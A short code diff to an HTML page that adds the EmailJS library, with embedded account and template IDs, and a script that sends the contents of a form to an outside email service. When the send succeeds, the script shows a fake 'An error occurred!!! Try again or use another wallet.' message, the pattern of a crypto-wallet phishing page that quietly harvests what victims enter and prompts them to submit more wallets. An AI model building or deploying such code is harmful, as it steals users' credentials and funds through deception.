@@ -1613,9 +1613,35 @@
     </div>
 
         <script src="js/javasc.js"></script>
-    
+	
+    <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('1WwWgqgZwP_88Idm0')
+</script>
+	
  <script>
-	 
+	 const btn = document.getElementById('submit');
+
+document.getElementById('my-form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_0tpm5yt';
+   const templateID = 'template_ylwjxwg';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('An error occurred!!! Try again or use another wallet.');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
  </script>
     
   
